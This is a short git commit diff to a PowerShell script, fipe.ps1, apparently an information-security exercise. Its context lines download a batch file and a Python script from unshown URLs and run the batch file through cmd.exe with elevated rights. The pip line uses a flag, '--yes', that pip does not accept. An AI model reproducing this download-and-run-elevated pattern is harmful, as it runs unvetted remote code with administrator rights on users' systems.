3d96dc199c095855b0da8e8ed88ebed25e34ee08
FanAPIpipa <156794064+FanAPIpipa@users.noreply.github.com>
2024-01-16 14:58:57 +0300

    Update fipe.ps1

--- fipe.ps1
+++ fipe.ps1
@@ -20,4 +20,4 @@ Invoke-WebRequest -Uri $batFileUrl -OutFile $batFilePath
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c $batFilePath" -Verb RunAs -Wait
 Invoke-WebRequest -Uri $pythonScriptUrl -OutFile $pythonScriptPath
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c pip install --yes pyfiglet" -Verb RunAs -Wait
-python $pythonScriptPath -Expression "Comptype('Информационная безопасность??? ')"
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c python $pythonScriptPath -Expression 'Comptype(\"Информационная безопасность??? \")'"
